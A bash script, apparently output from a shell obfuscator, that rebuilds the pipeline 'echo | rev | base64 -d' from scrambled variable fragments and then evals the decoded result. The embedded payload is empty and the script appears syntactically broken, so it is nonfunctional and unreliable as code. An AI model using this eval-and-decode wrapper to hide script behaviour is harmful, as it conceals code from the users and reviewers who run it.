#!/bin/bash
#Obfuscated By Muhamad Badru
zROzWOqBiHBwVRJSrgacXRJGfumDjiCCqMtQyBxuWeLJUcKRrRlRdAjnMekgUEqudfdDEZVgSfUpqQQvbNDqCeYOuEHKFCeTvZAt="nGUraXBPCHnDnxuJFUzYficLwePKEZZcLWxMtGdybzwWRDWNAOlfWZPTYVkznLoHbuAKexAKqNDDDxjISgazXBcDQAYGdNIsOSQe";rLRXfNZmWmAPdJpXUawYLhmGkiGmoIAuwmUCfJAvveJbtIDroWyFzhcEamoXSftLIvmlXEoZEOIsUBmstSuJarjXXbfPtSPSrKVe="snreiSdTtxDnKrdmyTpedgvwfnXvsWeBbDsjxdptvUNrIzBGOCziBJPhSFBFUvcALHAofJubGURmmJQKvmkeiyJxNdBRlMHZxoud";SiBWEQmclSUrrEFvEiZZBIbXTJuoTaMIIkBYrxOWukBKpODufLeRQWDjmfqWlDOFceApWjFzqnMoHZiTFVVloZRixhNSyzGlndUA="ch";ZPGdUHiuKNrZdXcwdByMmjMEcErsWDYSMbhSNfsVRjYFNgESSjysbdkSRUDrquzIHQgqWlxyAaebvVcXZmAiwjWyakYalhgFtwwP="4";UWKQGuUZNwWttNfyTvOyFxMRUKxRpZNyPeXtBLgSulKMikmRSfCMTHDNWhyQNJFHtvXBCuUToebSgqKalDNnOdhAFzSNEimcFjyw="";tjKPLwCMnRTBtRjRFhDvBfgUEXyFHsnfuETseIUgyOdCKTAnMmhSyXeQRtpxpjOywlSbRekHDrGPHZPKDevNBCGDNNlOSllTDHjq="UTsNseSBovwVmnUNuwkFrWOmGyGhZAZyBxBfpwdaVDxVGgnrVtrlbHRygqEAuLdAPrxudDigxJBbkzZZEFgEgAcNOCDFIoMyGgHP";yPeKxcejILDEsBfWEDWnYPFuQRGdwPlpNSQEKmPVZnmgMoqmyCrRGdBazjkyWEcEGXuFdTyqmnZInUMvbMlFnAKVPlAtnjuFNMjf="  | r";jlDUZUqkAEBTQgfcbrfjcrcWYHoCWuKBMlSckzNeMHmHNYNWZzjAzPIrZoKwpXKNDuneRUvYNzLPPZvaRGfTrRNacnFpZmwlSPEj="AJDeJXaQhLtxuFymTfpJlTOyoyKENGjaFZMiTwvUIFFNvOirXLNbuRiILlymJphSPlpJqWURJQQyUkuAGxeZsZIUQveLVxAbsOSC";rdoaidPWGvmREVqhezgoYHkkJkItZTAIgNPnmkwCMndoVvEFkUXeQvLJWFZhOfUlVYUSfgMCuyHpzLtDJQkEQymNumQhjxdWxHgw="";dCCemwFnWMQBmfFNxHaQUuKHlVKnXSvFENYWcDDXEXITlxvjktuPvcXqxDkgjenlKugtyyUCuPhLlZGSSMBGqhVaebromlKttHub="as";hoXmYKCsIPoCTLpmfALwuWvAySvBBcKbTNYeNVrBhmNoxgQkPRMCnaNSCupLeQUHlcRzkaisnhcJJkLLXWdGQCiIrWuVQyxeqRxG="ycpiRhPtoGZJxDlJewcAsoptZvBLiMZmVoARbHOAqCwLxpunNtupaDMthyCXSJxBdRGMliWoDPtBWoKgUPMuHeNTnigVIjhVfasP";APQOCxNYwXteEMTbuoqbpFpfhMxFuZRGWVNoQvxkpUiewqJjemqKtUIKdyCvmCMccMaPhTAlIRbjDcDMGRRrzABNIBgtfebaqdDm="EBUMZlaMopyvPBvsRXxksVLmddGZYowyCPqcnTdNsObvSTqAUaLXrULlhwLMPJEazbQCcWnOerXeHnCIhlsCMmWRNJcpTNFGfILK";RVVYpCbHQuFOuuzbhFPYwiqbpBJpPPvssvfNChIUNUrZZgkTNiCHXStzHpxQETbMBEsVdzyuaDuouxCQJKrKpOYrIAXYulbDwOoh="o";cBvkAHyoqFmrPHHYLvjAUlpewjgnuRkgDcdddJBNYWLPmJYNFXlcYNfejfqPdZiFrItbDRCumkBBCLAjHzzflnJaReYwrJybtQht="6";fTdABDenmqsNnPpNpmgNOSVpNHwHoUEDIJHfTVtbrDpZVPEsFsFgLcHJkXUNfmzWstdWYlvIqrSzdqLnRDNaxJmkpBrrvVwuDPfT="VpRQBfnVSmQDEGJIlpJQsdQYkwRNDrNptkwSXuOhqLGirdxbqcuZsaDBHRwEeNtagoCZleqkDpdSjDsnvdoXNlSRqylMbhHljUYH";OJdnrUOsHTDwEqngUTbRuESctJZMaUiCLOtiOMDAoLZubrBlCMckeGPSKyxZtZBMJwZfKAIlzEKdHIZOyzTSEYGqZIMNSaVWXrWs=" -d";TeEXyQMVmdgfkzJudulQeKUqUGTJVSRIofELRsOfKuqQsqKHGPhTFOEeSzNxAgIelEhABvYNRimKlqEGfztqJwOrXRJWgfvUhvZU="gbBPqtdKmKokDVbFEsHHasUGnQtVxtCIdEPlOEDMEChBlqOGbkIpHLbsSYWRIxRYavEmvrzHDSLGYdCuYWKLaedYrwKtJNyMjENh";VXHhEbWwGqzjwyEjFgTEyvIWXkVtOdZORCvEYJYLKxALNolXsmGocJJMyLIbyybijaiKZBFVmLmkLJCGsVvvaRRLmipOSDZrVCIm="";gZOdLtsJnHLXxdSVDaDceNxPWdtdANDoesAqQWXCDXfnLnwHqWonWsuXytXnbnEYOUqRSkTYHSCYBNErBNDaqwtxhqUOBUFSjhqI="b";dJPfzoGJwYivywqbCyNSzjVzRFmRPVyhfIhciTlMxTgZlwFWRyJOdDxZYbvEsGUgBMhlygBujDWbJzQOsBrYelTpaUwlecKoojAr="e";cdottsZlqqgjzaMtwtnqggPgzuHmpytpBZKyjbIIXMXUqXKqXtwpKsuQYsnQFvCvuuqpYOeycWsNYUzqAtvIrQgQMcRPNHASiSin="v |";Tx=Eds;WVdfSJOpblqsEssYIzoGWzDVfrYrLSovKlHIKnoJMcFSaRcsmlOCpeCehMkZJKNvPmbfXVHuCktztkVOwuPxdgOlSHRIgGEdqKDa="";=$(eval "$rdoaidPWGvmREVqhezgoYHkkJkItZTAIgNPnmkwCMndoVvEFkUXeQvLJWFZhOfUlVYUSfgMCuyHpzLtDJQkEQymNumQhjxdWxHgw$dJPfzoGJwYivywqbCyNSzjVzRFmRPVyhfIhciTlMxTgZlwFWRyJOdDxZYbvEsGUgBMhlygBujDWbJzQOsBrYelTpaUwlecKoojAr$SiBWEQmclSUrrEFvEiZZBIbXTJuoTaMIIkBYrxOWukBKpODufLeRQWDjmfqWlDOFceApWjFzqnMoHZiTFVVloZRixhNSyzGlndUA$UWKQGuUZNwWttNfyTvOyFxMRUKxRpZNyPeXtBLgSulKMikmRSfCMTHDNWhyQNJFHtvXBCuUToebSgqKalDNnOdhAFzSNEimcFjyw$RVVYpCbHQuFOuuzbhFPYwiqbpBJpPPvssvfNChIUNUrZZgkTNiCHXStzHpxQETbMBEsVdzyuaDuouxCQJKrKpOYrIAXYulbDwOoh$yPeKxcejILDEsBfWEDWnYPFuQRGdwPlpNSQEKmPVZnmgMoqmyCrRGdBazjkyWEcEGXuFdTyqmnZInUMvbMlFnAKVPlAtnjuFNMjf$dJPfzoGJwYivywqbCyNSzjVzRFmRPVyhfIhciTlMxTgZlwFWRyJOdDxZYbvEsGUgBMhlygBujDWbJzQOsBrYelTpaUwlecKoojAr$cdottsZlqqgjzaMtwtnqggPgzuHmpytpBZKyjbIIXMXUqXKqXtwpKsuQYsnQFvCvuuqpYOeycWsNYUzqAtvIrQgQMcRPNHASiSin$rdoaidPWGvmREVqhezgoYHkkJkItZTAIgNPnmkwCMndoVvEFkUXeQvLJWFZhOfUlVYUSfgMCuyHpzLtDJQkEQymNumQhjxdWxHgw$gZOdLtsJnHLXxdSVDaDceNxPWdtdANDoesAqQWXCDXfnLnwHqWonWsuXytXnbnEYOUqRSkTYHSCYBNErBNDaqwtxhqUOBUFSjhqI$WVdfSJOpblqsEssYIzoGWzDVfrYrLSovKlHIKnoJMcFSaRcsmlOCpeCehMkZJKNvPmbfXVHuCktztkVOwuPxdgOlSHRIgGEdqKDa$dCCemwFnWMQBmfFNxHaQUuKHlVKnXSvFENYWcDDXEXITlxvjktuPvcXqxDkgjenlKugtyyUCuPhLlZGSSMBGqhVaebromlKttHub$dJPfzoGJwYivywqbCyNSzjVzRFmRPVyhfIhciTlMxTgZlwFWRyJOdDxZYbvEsGUgBMhlygBujDWbJzQOsBrYelTpaUwlecKoojAr$cBvkAHyoqFmrPHHYLvjAUlpewjgnuRkgDcdddJBNYWLPmJYNFXlcYNfejfqPdZiFrItbDRCumkBBCLAjHzzflnJaReYwrJybtQht$UWKQGuUZNwWttNfyTvOyFxMRUKxRpZNyPeXtBLgSulKMikmRSfCMTHDNWhyQNJFHtvXBCuUToebSgqKalDNnOdhAFzSNEimcFjyw$ZPGdUHiuKNrZdXcwdByMmjMEcErsWDYSMbhSNfsVRjYFNgESSjysbdkSRUDrquzIHQgqWlxyAaebvVcXZmAiwjWyakYalhgFtwwP$OJdnrUOsHTDwEqngUTbRuESctJZMaUiCLOtiOMDAoLZubrBlCMckeGPSKyxZtZBMJwZfKAIlzEKdHIZOyzTSEYGqZIMNSaVWXrWs$WVdfSJOpblqsEssYIzoGWzDVfrYrLSovKlHIKnoJMcFSaRcsmlOCpeCehMkZJKNvPmbfXVHuCktztkVOwuPxdgOlSHRIgGEdqKDa");eval "$VXHhEbWwGqzjwyEjFgTEyvIWXkVtOdZORCvEYJYLKxALNolXsmGocJJMyLIbyybijaiKZBFVmLmkLJCGsVvvaRRLmipOSDZrVCIm$$rdoaidPWGvmREVqhezgoYHkkJkItZTAIgNPnmkwCMndoVvEFkUXeQvLJWFZhOfUlVYUSfgMCuyHpzLtDJQkEQymNumQhjxdWxHgw$UWKQGuUZNwWttNfyTvOyFxMRUKxRpZNyPeXtBLgSulKMikmRSfCMTHDNWhyQNJFHtvXBCuUToebSgqKalDNnOdhAFzSNEimcFjyw"